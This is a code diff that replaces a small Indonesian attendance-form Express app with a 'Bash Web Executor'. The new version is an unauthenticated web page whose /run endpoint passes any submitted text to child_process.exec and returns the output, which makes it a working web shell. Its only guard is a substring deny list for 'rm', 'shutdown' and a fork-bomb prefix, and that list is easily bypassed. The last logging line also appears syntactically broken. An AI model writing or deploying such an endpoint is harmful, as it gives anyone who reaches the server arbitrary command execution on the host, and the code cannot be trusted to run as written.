@@ -1,82 +1,107 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
-const bodyParser = require('body-parser');
+const { exec } = require('child_process');
 
 const app = express();
-const PORT = 3000;
+const port = process.env.PORT || 7820;
 
-// Path direktori dan file database
-const dbDir = path.join(__dirname, 'tmp');
-const dbFile = path.join(dbDir, 'DB.json');
-
-// Middleware
-app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 
-// Buat folder dan file jika belum ada
-function ensureDB() {
-    if (!fs.existsSync(dbDir)) {
-        fs.mkdirSync(dbDir, { recursive: true });
-    }
-
-    if (!fs.existsSync(dbFile)) {
-        fs.writeFileSync(dbFile, JSON.stringify([]), 'utf-8');
-    }
-}
-ensureDB();
-
-// Fungsi bantu untuk baca/tulis file database
-function readDB() {
-    ensureDB();
-    return JSON.parse(fs.readFileSync(dbFile, 'utf-8'));
-}
-
-function writeDB(data) {
-    ensureDB();
-    fs.writeFileSync(dbFile, JSON.stringify(data, null, 2), 'utf-8');
-}
-
-// Rute tampilan form absen
+// Halaman HTML langsung dari route /
 app.get('/', (req, res) => {
-    res.send(`
-        <h2>Form Absen</h2>
-        <form method="POST" action="/absen">
-            <input type="text" name="nama" placeholder="Masukkan nama" required />
-            <button type="submit">Absen</button>
-        </form>
-        <br />
-        <a href="/data">Lihat Daftar Absen</a>
-    `);
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <title>Bash Executor</title>
+      <style>
+        body {
+          font-family: monospace;
+          background: #121212;
+          color: #00ff00;
+          padding: 20px;
+        }
+        textarea, pre {
+          width: 100%;
+          background: #1e1e1e;
+          color: #00ff00;
+          border: none;
+          padding: 10px;
+          font-size: 16px;
+        }
+        button {
+          margin-top: 10px;
+          background: #333;
+          color: white;
+          border: none;
+          padding: 10px 20px;
+          cursor: pointer;
+        }
+        button:hover {
+          background: #555;
+        }
+      </style>
+    </head>
+    <body>
+      <h1>Bash Web Executor</h1>
+      <textarea id="command" rows="4" placeholder="Masukkan perintah bash di sini..."></textarea>
+      <button onclick="runCommand()">Jalankan</button>
+      <h2>Output:</h2>
+      <pre id="output">Menunggu perintah...</pre>
+
+      <script>
+        async function runCommand() {
+          const command = document.getElementById('command').value;
+          const outputElement = document.getElementById('output');
+          outputElement.textContent = "Menjalankan perintah...";
+
+          try {
+            const res = await fetch('/run', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ command })
+            });
+
+            const data = await res.json();
+            if (data.error) {
+              outputElement.textContent = "Error:\\n" + data.error;
+            } else {
+              outputElement.textContent = data.stdout || '(Tidak ada output)\\n' + (data.stderr || '');
+            }
+          } catch (err) {
+            outputElement.textContent = "Request error:\\n" + err.message;
+          }
+        }
+      </script>
+    </body>
+    </html>
+  `);
 });
 
-// Rute proses absen
-app.post('/absen', (req, res) => {
-    const { nama } = req.body;
-    const data = readDB();
-    const waktu = new Date().toISOString();
+// Endpoint untuk eksekusi perintah bash
+app.post('/run', (req, res) => {
+  const { command } = req.body;
 
-    data.push({ nama, waktu });
-    writeDB(data);
+  if (!command || typeof command !== 'string') {
+    return res.status(400).json({ error: 'Command tidak valid' });
+  }
 
-    res.send(`<p>Terima kasih, <b>${nama}</b>. Absen dicatat pada: ${waktu}</p><a href="/">Kembali</a>`);
+  // Optional: batasi perintah berbahaya
+  if (command.includes('rm') || command.includes('shutdown') || command.includes(':(){')) {
+    return res.status(403).json({ error: 'Command tidak diizinkan' });
+  }
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      return res.status(500).json({ error: error.message });
+    }
+    res.json({ stdout, stderr });
+  });
 });
 
-// Rute lihat data absen
-app.get('/data', (req, res) => {
-    const data = readDB();
-    const list = data.length > 0
-        ? data.map((item, i) => `<li>${i + 1}. ${item.nama} - ${item.waktu}</li>`).join('')
-        : '<li>Belum ada data absen.</li>';
-
-    res.send(`
-        <h2>Daftar Absen</h2>
-        <ul>${list}</ul>
-        <a href="/">Kembali ke Form</a>
-    `);
-});
-
-// Jalankan server
-app.listen(PORT, () => {
-    console.log(`Server absen berjalan di http://localhost:${PORT}`);
+// Mulai server
+app.listen(port, () => {
+  console.log(\`Server berjalan di http://localhost:\${port}\`);
 });
